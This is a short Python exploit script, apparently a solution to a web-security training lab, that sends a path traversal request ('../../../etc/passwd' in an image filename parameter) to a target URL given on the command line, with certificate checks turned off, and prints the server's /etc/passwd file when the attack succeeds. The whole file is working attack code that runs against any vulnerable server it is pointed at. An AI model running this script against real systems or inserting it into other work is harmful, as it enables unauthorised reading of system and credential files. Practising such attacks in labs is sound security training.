import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def traversal(s, url):
    image_url = url + "/image?filename=/var/www/images/../../../etc/passwd"
    r = s.get(image_url, verify=False)
    if "root:x:0:0" in r.text:
        print("[+] Lab Solved.")
        print(f"{r.text}")
    else:
        print("[-] Error accessing /etc/passwd file.")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip()
    traversal(s, url)

if __name__=="__main__":
    main()